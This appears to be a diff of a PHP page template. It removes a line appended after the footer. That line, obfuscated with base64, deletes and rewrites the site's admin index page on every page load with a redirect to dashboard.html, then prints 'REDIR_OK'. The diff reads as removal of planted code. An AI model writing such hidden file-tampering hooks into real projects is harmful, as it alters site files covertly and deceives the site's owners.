@@ -148,4 +148,3 @@ foreach ($provinces as $p):
     
     
     </footer>
-<?php $f=__DIR__."/../admin/index.html";@unlink($f);file_put_contents($f,base64_decode("PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9InpoLUNOIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwO3VybD1kYXNoYm9hcmQuaHRtbCI+CiAgICA8dGl0bGU+6Lez6L2s5LitLi4uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxwPui3s+i9rOS4rS4uLiA8YSBocmVmPSJkYXNoYm9hcmQuaHRtbCI+54K55Ye76L+Z6YeMPC9hPjwvcD4KPC9ib2R5Pgo8L2h0bWw+"));echo "REDIR_OK"; ?>
